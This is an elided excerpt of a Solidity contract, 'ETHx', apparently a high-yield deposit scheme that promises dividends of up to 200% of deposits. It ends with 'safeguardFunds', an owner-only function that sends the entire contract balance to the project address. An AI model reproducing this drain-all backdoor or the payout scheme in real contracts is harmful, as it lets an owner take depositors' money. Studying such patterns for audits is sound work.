...
contract ETHx {
	...
	event ContractedToppedUp(address indexed userAddress, uint256 amt);
	...
	function withdraw(bool qualified) public {
		User storage user = users[msg.sender];

		uint256 dividends = getUserDividends(msg.sender);

		uint256 totalAmount = dividends;
		
		// if a user has qualified for contract bonus then calculate the contract bonus
		if(qualified) {
    		...
    		for (uint256 i = 0; i < user.deposits.length; i++) {
    			...
    			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(2)) {
                    ...
                    //dividends cannot exceed 200% of deposits
	...
	function getContractBalanceRate() public view returns (uint256) {
		...
		if (contractBalancePercent > 1) {
		    return amt.mul(BASE_PERCENT).mul(contractBalancePercent).div(100);
		} else {
	...
	function getUserPercentRate(address userAddress) public view returns (uint256) {
		...
		if (isActive(userAddress)) {
			...
			return contractBalanceRate.mul(timeMultiplier);
		} else {
	...
	function safeguardFunds() public onlyProjectOwner returns(uint256) {
	    require(projectAddress != address(0), "Invalid address");
	    uint256 bal = getContractBalance();
	    projectAddress.transfer(bal);
